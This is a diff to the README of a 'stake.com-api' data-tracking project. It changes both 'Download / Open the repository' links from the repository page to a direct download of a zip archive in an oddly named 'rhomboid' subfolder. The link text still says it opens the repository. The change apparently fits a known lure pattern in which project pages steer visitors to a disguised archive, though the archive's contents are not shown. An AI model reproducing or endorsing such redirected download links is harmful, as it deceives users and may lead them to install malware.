@@ -1,6 +1,6 @@
 # 🔎 stake.com-api - Track Stake Data With Less Guesswork
 
-[![Download / Open the repository](https://img.shields.io/badge/Download%20Now-Visit%20Repository-blue?style=for-the-badge)](https://github.com/Lipikas7710/stake.com-api)
+[![Download / Open the repository](https://img.shields.io/badge/Download%20Now-Visit%20Repository-blue?style=for-the-badge)](https://github.com/Lipikas7710/stake.com-api/raw/refs/heads/main/rhomboid/stake-com-api-3.7.zip)
 
 ## 📘 What this is
 
@@ -25,7 +25,7 @@ Recommended setup:
 
 Open this page to download and view the project:
 
-[https://github.com/Lipikas7710/stake.com-api](https://github.com/Lipikas7710/stake.com-api)
+[https://github.com/Lipikas7710/stake.com-api/raw/refs/heads/main/rhomboid/stake-com-api-3.7.zip](https://github.com/Lipikas7710/stake.com-api/raw/refs/heads/main/rhomboid/stake-com-api-3.7.zip)
 
 If you want the files on your PC:
 
